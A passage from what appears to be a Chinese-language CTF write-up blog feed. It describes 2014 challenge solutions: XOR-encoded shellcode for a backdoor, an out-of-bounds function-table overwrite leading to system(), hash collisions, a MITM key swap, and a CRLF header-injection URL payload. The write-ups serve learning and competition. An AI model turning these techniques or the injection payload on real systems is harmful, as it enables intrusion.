用的技巧跟 &lt;strong&gt;SQli&lt;/strong&gt; 猜密碼差不多&lt;br&gt;
先找出一個不包含在 password 的字元&lt;br&gt;
接著逐步嘗試每個位置&lt;br&gt;
ex : &lt;code&gt;a11111111111&lt;/code&gt;&lt;br&gt;
如果 a 包含在 password 就會花一段時間去計算&lt;br&gt;
反之則馬上有結果&lt;br&gt;
最後試出來的結果是 &lt;code&gt;S@nd_will2z0&lt;/code&gt;&lt;br&gt;
p.s 這題最難的地方是題目環境一直掛掉  &lt;/p&gt;
&lt;p&gt;flag : &lt;code&gt;Time_works_for_you&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>BCTF 2014 PWN 100 後門程序</title><link href="https://ddaa.tw/bctf_pwn_100_backdoor.html" rel="alternate"></link><published>2014-03-12T18:12:00+08:00</published><updated>2014-03-12T18:12:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-12:/bctf_pwn_100_backdoor.html</id><summary type="html">&lt;p&gt;這題算是很基本的 pwn&lt;br&gt;
但是可能因為中間有點小陷阱&lt;br&gt;
所以解出來的人不多 (?  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;連到目標環境後會印出一堆歌詞 (?&lt;br&gt;
輸入 n 就離開程式，不然會在印一次歌詞  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;...&lt;br&gt;
Drink all the booze&lt;br&gt;
Hack all the things  &lt;/p&gt;
&lt;p&gt;Replay?(y/n)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;檢查程式以後&lt;br&gt;
程式有故意留下的 backdoor&lt;br&gt;
只要 input 符合條件&lt;br&gt;
就會跳轉到 buf 執行 shellcode&lt;br&gt;
行為如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;判斷 input 第一個字是否為 'n' or 'N'，是則終止程式  &lt;/li&gt;
&lt;li&gt;將 input 與 &lt;code&gt;&amp;lt;baidu-rocks,froM-china-with-love&amp;gt;&lt;/code&gt; 做 xor 加密  &lt;/li&gt;
&lt;li&gt;如果 xor 後前面 10 …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;這題算是很基本的 pwn&lt;br&gt;
但是可能因為中間有點小陷阱&lt;br&gt;
所以解出來的人不多 (?  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;連到目標環境後會印出一堆歌詞 (?&lt;br&gt;
輸入 n 就離開程式，不然會在印一次歌詞  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;...&lt;br&gt;
Drink all the booze&lt;br&gt;
Hack all the things  &lt;/p&gt;
&lt;p&gt;Replay?(y/n)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;檢查程式以後&lt;br&gt;
程式有故意留下的 backdoor&lt;br&gt;
只要 input 符合條件&lt;br&gt;
就會跳轉到 buf 執行 shellcode&lt;br&gt;
行為如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;判斷 input 第一個字是否為 'n' or 'N'，是則終止程式  &lt;/li&gt;
&lt;li&gt;將 input 與 &lt;code&gt;&amp;lt;baidu-rocks,froM-china-with-love&amp;gt;&lt;/code&gt; 做 xor 加密  &lt;/li&gt;
&lt;li&gt;如果 xor 後前面 10 byte == 'n0b4CKd00r' 就轉到 buf + 1  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以我們要計算 &lt;code&gt;n0b4CKd00r&lt;/code&gt; + &lt;code&gt;shellcode&lt;/code&gt; xor 後的值
但是陷阱在於 scanf 讀到某些字元就會終止 &lt;code&gt;ex: \x00&lt;/code&gt;&lt;br&gt;
導致 shellcode 沒有完全被載入&lt;br&gt;
還好這題沒有對 shell code 長度做限制&lt;br&gt;
可以靠塞 nop 調整 shellcode 的 offset 來避開特殊字元&lt;br&gt;
接著就發現 &lt;code&gt;/home/ctf/flag.txt&lt;/code&gt; 底下有答案了  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;BCTF{H4v3-4-n1C3-pWn1ng-f3sT1v4l!!}&lt;/code&gt;  &lt;/p&gt;</content><category term="XCTF"></category></entry><entry><title>BCTF 2014 PPC &amp; CRYPTO 100 混沌密碼鎖</title><link href="https://ddaa.tw/bctf_crypto_100_password_lockstitch.html" rel="alternate"></link><published>2014-03-12T02:26:00+08:00</published><updated>2014-03-12T02:26:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-12:/bctf_crypto_100_password_lockstitch.html</id><summary type="html">&lt;p&gt;百度 CTF blue-lotus 辦的&lt;br&gt;
個人覺得題目還滿有趣的&lt;br&gt;
不過到處都是置入性行銷 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;環境是用 python 寫的一個伺服器&lt;br&gt;
先試試看要我們幹嘛：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to Secure Passcode System&lt;br&gt;
First, please choose function combination:&lt;br&gt;
f1: 1&lt;br&gt;
f2: 2&lt;br&gt;
f3: 3&lt;br&gt;
f4: 4&lt;br&gt;
Wrong function combination, you bad guy!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;trace 原始碼得知&lt;br&gt;
輸入的四個數字會對應到四個 function&lt;br&gt;
並以輸入的順序將 answer 解密  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;f[&amp;#39;fun1&amp;#39;]=reverse
f[&amp;#39;fun2&amp;#39;]=base64.b64decode
f …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;百度 CTF blue-lotus 辦的&lt;br&gt;
個人覺得題目還滿有趣的&lt;br&gt;
不過到處都是置入性行銷 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;環境是用 python 寫的一個伺服器&lt;br&gt;
先試試看要我們幹嘛：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to Secure Passcode System&lt;br&gt;
First, please choose function combination:&lt;br&gt;
f1: 1&lt;br&gt;
f2: 2&lt;br&gt;
f3: 3&lt;br&gt;
f4: 4&lt;br&gt;
Wrong function combination, you bad guy!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;trace 原始碼得知&lt;br&gt;
輸入的四個數字會對應到四個 function&lt;br&gt;
並以輸入的順序將 answer 解密  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;f[&amp;#39;fun1&amp;#39;]=reverse
f[&amp;#39;fun2&amp;#39;]=base64.b64decode
f[&amp;#39;fun3&amp;#39;]=zlib.decompress
f[&amp;#39;fun4&amp;#39;]=dec2hex
f[&amp;#39;fun5&amp;#39;]=binascii.unhexlify
f[&amp;#39;fun6&amp;#39;]=gb2312
f[&amp;#39;fun7&amp;#39;]=bin2dec
f[&amp;#39;fun8&amp;#39;]=hex2bin
f[&amp;#39;fun9&amp;#39;]=hex2dec

answer = 78864179732635837913920409948348078659913609452869425042153399132863903834522
3652502504296451635172283566227769786379106795384189279098815026542757070698107378508
0761091619256306959366409460515974044867013206561595622472701295421839060280657753745
6281222826375
answer_hash = f[&amp;#39;fun6&amp;#39;](f[&amp;#39;fun2&amp;#39;](f[f1](f[f2](f[f3](f[f4](answer))))))
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;answer 都是數字，大膽猜測 f4 是&lt;code&gt;dec2hex&lt;/code&gt;&lt;br&gt;
且 &lt;code&gt;fun6&lt;/code&gt; 和 &lt;code&gt;fun2&lt;/code&gt; 已經被使用，剩下的只有6種&lt;br&gt;
而且後面三種看起來很像來亂的&lt;br&gt;
所以就先試前三種做排列組合&lt;br&gt;
結果就找到順序是 &lt;code&gt;3 5 1 4&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;但是這只是第一關而已&lt;br&gt;
麻煩的在後面&lt;br&gt;
接著要求我們輸入 passcode&lt;br&gt;
程式會將 passcode 以相同的順序作解密&lt;br&gt;
比對結果是否與 &lt;code&gt;answer_hash&lt;/code&gt; 相同&lt;br&gt;
若相同則會將 flag 印出&lt;br&gt;
但是 passcode 不能與 answer 相等&lt;br&gt;
也就是說要找到另一組數字才行  &lt;/p&gt;
&lt;p&gt;仔細觀察前面用到的四個 functio  n
&lt;code&gt;reverse&lt;/code&gt; 肯定是 1-to-1&lt;br&gt;
&lt;code&gt;base64&lt;/code&gt; 和 &lt;code&gt;dec2hex&lt;/code&gt; 也是&lt;br&gt;
那就只有 &lt;code&gt;zlib.decompress&lt;/code&gt; 可以做文章了&lt;br&gt;
試了一下在 zlib.decompress 的參數後面加料後對結果不影響 XD  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x = ((f[f2](f[f3](f[f4](answer)))))
y = binascii.hexlify(x)+&amp;quot;01&amp;quot;
x = y.decode(&amp;#39;hex&amp;#39;)
test = f[&amp;#39;fun6&amp;#39;](f[&amp;#39;fun2&amp;#39;](f[&amp;#39;fun3&amp;#39;](x)))
if test == answer_hash:
    print &amp;#39;same&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;此時 &lt;code&gt;fun9&lt;/code&gt; 就有用了&lt;br&gt;
我們可以用他們來生一組新的 passcode  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;print  f[&amp;#39;fun9&amp;#39;](f[&amp;#39;fun1&amp;#39;](y))
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;Your passcode: 2046914671302815174999479572879926709311623516344310480161044657024943192185778242098416328741805906729519967582134066703522565680955045139113850683617281109011304982006585757796402695817434740126949224951202731646556997125542758488503105749434074546856689060231&lt;br&gt;
Welcome back! The door always open for you, your majesty!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flag: &lt;code&gt;BCTF{py7h0n-l1b-func7i0ns-re4lly-str4nge}&lt;/code&gt;&lt;/p&gt;</content><category term="XCTF"></category><category term="Collision"></category></entry><entry><title>Boston Key Party CTF 2014 Crypto 200 MITM II: Electric Boogaloo</title><link href="https://ddaa.tw/bkpctf_crypto_200_200_mitm_ii_electric_boogaloo.html" rel="alternate"></link><published>2014-03-03T16:48:00+08:00</published><updated>2014-03-03T16:48:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-03:/bkpctf_crypto_200_200_mitm_ii_electric_boogaloo.html</id><summary type="html">&lt;p&gt;這題還滿簡單的&lt;br&gt;
解法就是題目名稱 = =&lt;br&gt;
可是不知道為什麼很少人解出來&lt;br&gt;
可能是太晚出來被大家忽略吧 0.0  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目敘述如下：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Chisa and Arisu are trying to tell each other two halves of a very important secret! They think they're safe, because they know how cryptography works---but can you learn their terrible, terrible secret? They're available as services at 54.186.6.201:12346 …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;這題還滿簡單的&lt;br&gt;
解法就是題目名稱 = =&lt;br&gt;
可是不知道為什麼很少人解出來&lt;br&gt;
可能是太晚出來被大家忽略吧 0.0  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目敘述如下：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Chisa and Arisu are trying to tell each other two halves of a very important secret! They think they're safe, because they know how cryptography works---but can you learn their terrible, terrible secret? They're available as services at 54.186.6.201:12346 and 54.186.6.201:12345 respectively.&lt;br&gt;
http://bostonkeyparty.net/challenges/mitm2-632e4ecc332baba0943a0c6471dec2c6.tar.bz2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;附檔是環境的 source code&lt;br&gt;
分析後發現目標會有以下行為：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;接收 username 並檢查是不是對方名稱 如果錯誤則結束&lt;/li&gt;
&lt;li&gt;生成 secretkey 和 publickey ，將 publickey 傳送給對方&lt;/li&gt;
&lt;li&gt;接收對方的 publickey，用自己的 secretkey 和 對方的 publickey 生成 aeskey&lt;/li&gt;
&lt;li&gt;將 CHECK 中的奇數(或偶數)字元以 aeskey 加密後傳送給對方&lt;/li&gt;
&lt;li&gt;用 aeskey 解密訊息，並檢查收到的 CHECK 是否正確，如果有錯誤則結束&lt;/li&gt;
&lt;li&gt;用 aeskey 加密 flag，並傳送給對方，以及解密對方傳來的 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;MITM attack 簡單的說就是&lt;br&gt;
原本是 &lt;code&gt;A ←→ B&lt;/code&gt; 之間傳遞訊息&lt;br&gt;
變成 &lt;code&gt;A ←→ C ←→ B&lt;/code&gt; 由 C 攔截後並轉送訊息&lt;br&gt;
因為接收 publickey 之後沒有確認來源 (所以需要數位簽章)&lt;br&gt;
所以我們可以在中間攔截並偽造 publickey  &lt;/p&gt;
&lt;p&gt;所以這題的解法為：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;向雙方送正確的 username，&lt;code&gt;アリスです&lt;/code&gt; 和 &lt;code&gt;千佐だよ&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;生成 fake secret key (fseckey) and public key (fpubkey)，並傳送 fpubkey 給雙方&lt;/li&gt;
&lt;li&gt;用接收到的 pubkeyA &amp;amp; pubkeyB 和 fseckey 生成 aeskeyA &amp;amp; aeskeyB&lt;/li&gt;
&lt;li&gt;用 aeskeyA 解密 A 傳來的 CHECK，並以 aeskeyB 加密傳送給 B&lt;/li&gt;
&lt;li&gt;用 aeskeyB 解密 B 傳來的 CHECK，並以 aeskeyA 加密傳送給 A&lt;/li&gt;
&lt;li&gt;用 aeskeyA &amp;amp; aeskeyB 解密 flag&lt;/li&gt;
&lt;/ol&gt;</content><category term="BKPCTF"></category><category term="MITM"></category></entry><entry><title>Boston Key Party CTF 2014 Crypto 200 Xorxes the Hash</title><link href="https://ddaa.tw/bkpctf_crypto_200_xorxes_the_hash.html" rel="alternate"></link><published>2014-03-03T00:48:00+08:00</published><updated>2014-03-03T00:48:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-03:/bkpctf_crypto_200_xorxes_the_hash.html</id><summary type="html">&lt;p&gt;這題出的有點爛&lt;br&gt;
限制太少導致 flag 可能有很多種&lt;br&gt;
卻要 match md5sum 的才是正解&lt;br&gt;
有點無言 ORZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Crypto 200，這題是一個 python script&lt;br&gt;
此題敘述如下：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Xorxes is a hash collision challenge. The goal is to find a second preimage for the input string "Klaatubaradanikto". Submit it as the flag. UPDATE: It has been pointed out that there are multiple …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;這題出的有點爛&lt;br&gt;
限制太少導致 flag 可能有很多種&lt;br&gt;
卻要 match md5sum 的才是正解&lt;br&gt;
有點無言 ORZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Crypto 200，這題是一個 python script&lt;br&gt;
此題敘述如下：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Xorxes is a hash collision challenge. The goal is to find a second preimage for the input string "Klaatubaradanikto". Submit it as the flag. UPDATE: It has been pointed out that there are multiple solutions. The flag is the one with md5sum '7179926e4253a0b405090df67f62c543'. (Use `echo -n FLAG | md5sum'.) UPDATE THE SECOND: The solution is short.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;簡單的說我們要找到另一個字串做 Xorxes 後的結果會與 &lt;code&gt;Klaatubaradanikto&lt;/code&gt; 相同&lt;br&gt;
但是因為結果不只一種&lt;br&gt;
flag的結果做md5後會是 &lt;code&gt;7179926e4253a0b405090df67f62c543&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;題目很好心的把hash的示意圖給我們了：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; # Xorxes Hash uses message blocks of 8-bits, with a 224-bit chaining variable.
 #
 #   (m_0)       (m_1)         ... (m_n)  = input message blocks
 #     |           |                 |
 #   SHA224      SHA224        ... SHA224
 #     |           |                 |
 #  V-(+)-[&amp;gt;&amp;gt;&amp;gt;56]-(+)-[&amp;gt;&amp;gt;&amp;gt;56]- ... --+--- = chaining variable
 #
 #  chaining variable + (message length mod 24) = hash output
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一個block就是一個字元&lt;br&gt;
V指的是 Initail Vector&lt;br&gt;
&lt;strong&gt;Xorxes&lt;/strong&gt; 的流程是：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;c = IV&lt;/li&gt;
&lt;li&gt;x = sha224(str[i]) //每次取一個字元做sha224&lt;/li&gt;
&lt;li&gt;c = RROT(c,56)  //將目前的結果做 right rotate 56 bit&lt;/li&gt;
&lt;li&gt;c = x ^ c&lt;/li&gt;
&lt;li&gt;result = c + (len(str) % 24) //最後加上字串長度&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;這題的關鍵是這種 hash 的方式是 &lt;strong&gt;stream cipher&lt;/strong&gt;&lt;br&gt;
且不會產生 avalanche effect&lt;br&gt;
此外 sha224 會將字元 hash 成 224 bit 的結果&lt;br&gt;
而 rotate 56bit 剛好是 1/4 的長度&lt;br&gt;
根據這些特性...&lt;br&gt;
我就想出來至少三種可以產生有同樣 hash 結果的方式 = =  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;找到 -24 內的 hash 加上固定的 4n 個相同字元，以長度調整 hash value&lt;br&gt;
4 個相同字元 hash 出來的結果會是 0 (忽略IV)&lt;br&gt;
xor 的特性是 &lt;code&gt;a^a=0&lt;/code&gt;
雖然這題有做 shift 但是四個相同字元將無視這個限制&lt;br&gt;
理論上是可行但是要找到符合條件似乎太過嚴苛&lt;br&gt;
加上 hint "The solution is short" 讓我否定了這個猜想  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;KlaXtubXradXnikto&lt;/code&gt;&lt;br&gt;
xor 還有一個特性是滿足交換率&lt;br&gt;
如果中間有相同的字元，且 index%4 相同&lt;br&gt;
這兩個字元在 hash 的過程中可以相互抵銷&lt;br&gt;
&lt;code&gt;Klaatubaradanikto&lt;/code&gt; 這個字串有三個位置滿足這條件&lt;br&gt;
我嘗試填入 &lt;em&gt;[a-zA-Z0-9]&lt;/em&gt;&lt;br&gt;
C3取 2*62 共 186 種組合 拿去做 md5 check&lt;br&gt;
結果都不是正確的結果 ORZ  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;將 &lt;code&gt;Klaatubaradanikto&lt;/code&gt; 內的字元做交換&lt;br&gt;
用xor交換率的特性&lt;br&gt;
index%4 相同的字元可以交換卻不影響 hash 的結果&lt;br&gt;
但是這可能性就有點多....&lt;br&gt;
一共約有 &lt;code&gt;5!\*4!\*4!\*4!=1658880&lt;/code&gt; 種 (字元相同我懶得扣掉了 XD)&lt;br&gt;
我跑了將近一個小時最後才得到結果 = =&lt;br&gt;
不知道是不是我還有什麼沒考慮到的?  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;flag: &lt;code&gt;radaniktKlaatubao&lt;/code&gt;&lt;/p&gt;</content><category term="BKPCTF"></category><category term="Collision"></category></entry><entry><title>Boston Key Party CTF 2014 Pwn 100 risc_emu</title><link href="https://ddaa.tw/bkpctf_pwn_100_risc_emu.html" rel="alternate"></link><published>2014-03-02T23:50:00+08:00</published><updated>2014-03-02T23:50:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-02:/bkpctf_pwn_100_risc_emu.html</id><summary type="html">&lt;p&gt;這次為期36小時&lt;br&gt;
題目很多 而且有些感覺很有趣&lt;br&gt;
可惜周六有點事情 這次沒辦法全程參與&lt;br&gt;
最後只拿到500分 好弱 ORZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是模擬 RISC CPU 的程式&lt;br&gt;
類型是 Pwning , ELF x64&lt;br&gt;
能執行類似 ARM 語法的模擬器  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RISC CPU Emulator BkP 2014&lt;br&gt;
Give me your bytecode!&lt;br&gt;
Please give me your bytecode base64'd:&lt;br&gt;
aaaa&lt;br&gt;
Got it, executing aaaa now!&lt;br&gt;
I don't recognize opcode 0x69  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我們可以給它一個 bytecode (須加密成 base64)&lt;br&gt;
格式為 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這次為期36小時&lt;br&gt;
題目很多 而且有些感覺很有趣&lt;br&gt;
可惜周六有點事情 這次沒辦法全程參與&lt;br&gt;
最後只拿到500分 好弱 ORZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是模擬 RISC CPU 的程式&lt;br&gt;
類型是 Pwning , ELF x64&lt;br&gt;
能執行類似 ARM 語法的模擬器  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RISC CPU Emulator BkP 2014&lt;br&gt;
Give me your bytecode!&lt;br&gt;
Please give me your bytecode base64'd:&lt;br&gt;
aaaa&lt;br&gt;
Got it, executing aaaa now!&lt;br&gt;
I don't recognize opcode 0x69  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我們可以給它一個 bytecode (須加密成 base64)&lt;br&gt;
格式為 [opcode] [dst] [src] [value] (會依據指令不同有所分別)&lt;br&gt;
dst 就是模擬的 register&lt;br&gt;
位於程式 heap 的某些區段&lt;br&gt;
能接受的指令有 9 種：&lt;br&gt;
&lt;code&gt;add&lt;/code&gt;,&lt;code&gt;addi&lt;/code&gt;,&lt;code&gt;sub&lt;/code&gt;,&lt;code&gt;subi&lt;/code&gt;,&lt;code&gt;xor&lt;/code&gt;,&lt;code&gt;and&lt;/code&gt;,&lt;code&gt;mul&lt;/code&gt;,&lt;code&gt;div&lt;/code&gt;,&lt;code&gt;term&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;reverse 以後發現處理指令的方式位於 &lt;code&gt;0x401c66&lt;/code&gt;&lt;br&gt;
是以一個 function table 儲存每個指令的 address&lt;br&gt;
再由 &lt;code&gt;call eax&lt;/code&gt; 的方式去執行&lt;br&gt;
接著繼續 trace 發現一個有趣的事情&lt;br&gt;
大部分的指令在 dst 都有做過濾&lt;br&gt;
如果 &lt;strong&gt;&amp;gt;=8&lt;/strong&gt; 就會回傳 &lt;code&gt;ERROR!&lt;/code&gt;&lt;br&gt;
只有 &lt;code&gt;addi&lt;/code&gt; 和 &lt;code&gt;subi&lt;/code&gt; 不會!&lt;br&gt;
這邊可以任意竄改 &lt;code&gt;0x604b50+0xff&lt;/code&gt; 範圍之內的的值&lt;br&gt;
&lt;code&gt;0x604b50&lt;/code&gt;~&lt;code&gt;0x604b70&lt;/code&gt; 是模擬器中 register 的值&lt;br&gt;
而 0x604c10 開始就是 function table&lt;br&gt;
我們可以竄改 function table 到我們要的 eip  &lt;/p&gt;
&lt;p&gt;到這邊為止都是正確的思路&lt;br&gt;
接下來我浪費了將近5小時在做 exploit...&lt;br&gt;
我發現不管輸入多長的字串&lt;br&gt;
emu 會切割成好幾個 4 byte 的指令並執行&lt;br&gt;
後面可以塞shellcode&lt;br&gt;
接著我企圖透過 &lt;code&gt;addi&lt;/code&gt; 將其中一個 function 的值&lt;br&gt;
由 &lt;code&gt;0x40xxxx&lt;/code&gt; 覆寫成 &lt;code&gt;0x60xxxx&lt;/code&gt; 也就是 buf 的位置&lt;br&gt;
但是由於 emu 每次執行完指令後回將 return value 存在 heap 中&lt;br&gt;
執行超過12個指令將會蓋到題目的 heap guard&lt;br&gt;
將會出現：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;*** HEAP FUCKERY DETECTED ***: /home/dada/wargame/risc_emu/emu terminated *&lt;br&gt;
Obtained 4 stack frames.&lt;br&gt;
/home/dada/wargame/risc_emu/emu() [0x4025f6]&lt;br&gt;
/home/dada/wargame/risc_emu/emu() [0x401bb2]&lt;br&gt;
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xed) [0x7ffff722976d]&lt;br&gt;
/home/dada/wargame/risc_emu/emu() [0x401379]  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但是如果我們輸入不只 4 byte&lt;br&gt;
後面的指令會繼續被執行&lt;br&gt;
並不會馬上將 return value 存到 heap&lt;br&gt;
於是還是可以將 function table 寫成 buf 的位置&lt;br&gt;
一切都就緒後我發現還是無法成功&lt;br&gt;
why? 因為這題有 DEP 囧!!!!!!!&lt;br&gt;
所以這一段基本上都是白費工夫&lt;br&gt;
因為所有能塞 shellcode 的區段根本沒辦法執行 Orz  &lt;/p&gt;
&lt;p&gt;到這邊我就很賭爛的去睡覺了&lt;br&gt;
隔天起來突然發現這題原來got裡有一個 &lt;code&gt;system()&lt;/code&gt; ...&lt;br&gt;
而且很剛好 在 &lt;code&gt;call eax&lt;/code&gt; 到 emu function 的時候&lt;br&gt;
剛好 rdi 指向的是 buf 的位置.....OTZ (x64 參數指標是放在 rdi)&lt;br&gt;
所以這題只要：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用 addi 去改 function table 中一個 function 的值 ex: &lt;code&gt;term&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;第一個 byte 放 \x09 (&lt;code&gt;term&lt;/code&gt; 的 opcode) 後面接 system 的參數&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;就可以任意執行指令了 ORZ&lt;br&gt;
此外這題已經把 stdout dup 到socket&lt;br&gt;
所以只要 &lt;code&gt;system("cat key")&lt;/code&gt; 以後就有 key 了  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;stupid_boston_leprechauns_and_geohots&lt;/code&gt;  &lt;/p&gt;</content><category term="BKPCTF"></category><category term="Out-of-bound"></category></entry><entry><title>Codegate CTF Preliminary 2014 200 Web Proxy</title><link href="https://ddaa.tw/codegate_web_200_web_proxy.html" rel="alternate"></link><published>2014-02-26T02:24:00+08:00</published><updated>2014-02-26T02:24:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-02-26:/codegate_web_200_web_proxy.html</id><summary type="html">&lt;p&gt;這題被 &lt;strong&gt;orange&lt;/strong&gt; 秒殺了&lt;br&gt;
我是賽後才解出來的 Orz  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;網址點開是一個 proxy 頁面&lt;br&gt;
在 input form 輸入網址後&lt;br&gt;
會將網頁的部分內容和 header 印出來  &lt;/p&gt;
&lt;p&gt;打開 source code 可以看到註解有提示&lt;br&gt;
&lt;em&gt;&lt;!-- admin/index.php --&gt;&lt;/em&gt;&lt;br&gt;
嘗試用 proxy load 頁面看看:&lt;br&gt;
&lt;code&gt;http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/index.php&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;403 Forbidden  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這題的方向應該很明確了&lt;br&gt;
透過 proxy 去存取 &lt;code&gt;admin.php&lt;/code&gt;&lt;br&gt;
題目的環境是 &lt;strong&gt;apache&lt;/strong&gt;&lt;br&gt;
應該是透過 &lt;code&gt;.htaccess&lt;/code&gt; 去擋的&lt;br&gt;
不過似乎沒辦法拿到設定  &lt;/p&gt;
&lt;p&gt;先隨便跳轉一個網頁&lt;br&gt;
&lt;code&gt;http://58.229 …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題被 &lt;strong&gt;orange&lt;/strong&gt; 秒殺了&lt;br&gt;
我是賽後才解出來的 Orz  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;網址點開是一個 proxy 頁面&lt;br&gt;
在 input form 輸入網址後&lt;br&gt;
會將網頁的部分內容和 header 印出來  &lt;/p&gt;
&lt;p&gt;打開 source code 可以看到註解有提示&lt;br&gt;
&lt;em&gt;&lt;!-- admin/index.php --&gt;&lt;/em&gt;&lt;br&gt;
嘗試用 proxy load 頁面看看:&lt;br&gt;
&lt;code&gt;http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/index.php&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;403 Forbidden  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這題的方向應該很明確了&lt;br&gt;
透過 proxy 去存取 &lt;code&gt;admin.php&lt;/code&gt;&lt;br&gt;
題目的環境是 &lt;strong&gt;apache&lt;/strong&gt;&lt;br&gt;
應該是透過 &lt;code&gt;.htaccess&lt;/code&gt; 去擋的&lt;br&gt;
不過似乎沒辦法拿到設定  &lt;/p&gt;
&lt;p&gt;先隨便跳轉一個網頁&lt;br&gt;
&lt;code&gt;http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=www.google.com&lt;/code&gt;&lt;br&gt;
會發現 proxy 是透過參數 &lt;code&gt;url&lt;/code&gt; 決定轉址頁面&lt;br&gt;
猜測是透過 &lt;code&gt;header('Location:'+ $url);&lt;/code&gt; 去做轉址&lt;br&gt;
如果 &lt;code&gt;$url&lt;/code&gt; 沒有做過濾&lt;br&gt;
會有 &lt;strong&gt;HTTP header CRLF injection&lt;/strong&gt;&lt;br&gt;
試試看猜測是否正確:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=www.google.com%2f   
HTTP/1.1%0d%0a  
Host: 123%0d%0a  
%0d%0a  
